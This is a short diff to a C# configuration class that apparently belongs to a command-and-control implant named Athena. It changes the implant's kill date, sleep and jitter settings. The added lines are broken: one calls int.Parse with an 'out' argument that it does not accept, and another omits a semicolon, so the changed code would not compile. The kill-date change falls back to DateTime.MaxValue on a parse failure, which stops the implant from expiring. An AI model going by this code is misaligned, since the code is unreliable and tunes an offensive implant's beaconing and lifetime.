@@ -28,10 +28,11 @@ namespace Athena.Config
             //this.jitter = jitter;
             //this.currentConfig = new Websocket(this.uuid);
             this.uuid = "b3b72cb5-8e39-498f-9b27-525d05ac394e";
-            this.killDate = DateTime.Parse("2022-08-25");
-            int sleep = int.TryParse("0", out sleep) ? sleep : 60;
+            DateTime kd = DateTime.TryParse("2022-08-25", out kd) ? kd : DateTime.MaxValue;
+            this.killDate = kd;
+            int sleep = int.Parse("0", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("0", out jitter) ? jitter : 10;
+            int jitter = int.Parse("0")
             this.jitter = jitter;
             this.currentConfig = new Websocket(this.uuid);
             this.smbConfig = new SmbServer();
